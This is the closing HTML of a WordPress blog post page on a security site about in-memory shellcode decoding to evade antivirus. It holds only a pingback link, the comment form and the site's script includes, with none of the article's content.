				Pingback: <a href='http://zone.ci/archives/4hou/4hou_vulns/2022/04/10/353412.html' rel='external nofollow' class='url'>利用API unhooking完成进程注入，成功绕过Bitdefender检测 | ZONE.CI 全球网</a> 			</div>
</li><!-- #comment-## -->
		</ol><!-- .comment-list -->

		
	
	
		<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/in-memory-shellcode-decoding-to-evade-avs/#respond" style="display:none;">Cancel reply</a></small></h3>			<form action="https://shells.systems/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate>
				<p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> Required fields are marked <span class="required">*</span></p><p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required="required"></textarea></p><p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" required='required' /></p>
<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" required='required' /></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" /></p>
<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='1366' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="2e578c261e" /></p><p style="display: none !important;"><label>&#916;<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label><input type="hidden" id="ak_js_1" name="ak_js" value="215"/><script>document.getElementById( "ak_js_1" ).setAttribute( "value", ( new Date() ).getTime() );</script></p>			</form>
			</div><!-- #respond -->
	
</div><!-- .comments-area -->
		</main><!-- .site-main -->
			</div><!-- content-area -->

        </div><!-- .site-content -->
        
                <footer id="colophon" class="site-footer" role="contentinfo">
            <div class="site-info container">
                            <a href="https://wordpress.org/">Proudly powered by WordPress</a>
            </div>
        </footer>
        
    </div><!-- site-inner -->
</div><!-- site -->

    <script type="text/javascript">
        var templateUrl = 'https://shells.systems';
        var post_id = '1366';
    </script>
    <script type='text/javascript' src='https://shells.systems/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shCore.js?ver=3.0.9b'></script>
<script type='text/javascript' src='https://shells.systems/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushCpp.js?ver=3.0.9b'></script>
<script type='text/javascript' src='https://shells.systems/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushPython.js?ver=3.0.9b'></script>
<script type='text/javascript'>
	(function(){
		var corecss = document.createElement('link');
		var themecss = document.createElement('link');
		var corecssurl = "https://shells.systems/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b";
		if ( corecss.setAttribute ) {
				corecss.setAttribute( "rel", "stylesheet" );
				corecss.setAttribute( "type", "text/css" );
				corecss.setAttribute( "href", corecssurl );
		} else {
				corecss.rel = "stylesheet";
				corecss.href = corecssurl;
		}
		document.head.appendChild( corecss );
		var themecssurl = "https://shells.systems/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeDefault.css?ver=3.0.9b";
		if ( themecss.setAttribute ) {
				themecss.setAttribute( "rel", "stylesheet" );
				themecss.setAttribute( "type", "text/css" );
				themecss.setAttribute( "href", themecssurl );
		} else {
				themecss.rel = "stylesheet";
				themecss.href = themecssurl;
		}
		document.head.appendChild( themecss );
	})();
	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
	SyntaxHighlighter.config.strings.help = '?';
	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
	SyntaxHighlighter.defaults['toolbar'] = false;
	SyntaxHighlighter.all();

	// Infinite scroll support
	if ( typeof( jQuery ) !== 'undefined' ) {
		jQuery( function( $ ) {
			$( document.body ).on( 'post-load', function() {
				SyntaxHighlighter.highlight();
			} );
		} );
	}
</script>
<script type='text/javascript' src='https://shells.systems/wp-content/themes/thesimplest/assets/js/skip-link-focus-fix.js?ver=1.0'></script>
<script type='text/javascript' src='https://shells.systems/wp-content/themes/thesimplest/assets/js/bootstrap.min.js?ver=3.3.7'></script>
<script type='text/javascript' src='https://shells.systems/wp-includes/js/comment-reply.min.js?ver=5.0.2'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var thesimplest_screenReaderText = {"expand":"expand child menu","collapse":"collapse child menu"};
/* ]]> */
</script>
<script type='text/javascript' src='https://shells.systems/wp-content/themes/thesimplest/assets/js/main.js?ver=1.0'></script>
<script type='text/javascript' src='https://shells.systems/wp-includes/js/wp-embed.min.js?ver=5.0.2'></script>
<script defer type='text/javascript' src='https://shells.systems/wp-content/plugins/akismet/_inc/akismet-frontend.js?ver=1673961197'></script>
<script type='text/javascript' src='https://shells.systems/wp-content/plugins/srs-simple-hits-counter/js/srs_simple_hits_counter_js.js?ver=5.0.2'></script>
			<script type="text/javascript">
				jQuery.fn.prettyPhoto   = function () { return this; };
				jQuery.fn.fancybox      = function () { return this; };
				jQuery.fn.fancyZoom     = function () { return this; };
				jQuery.fn.colorbox      = function () { return this; };
				jQuery.fn.magnificPopup = function () { return this; };
			</script>
		</body>
</html>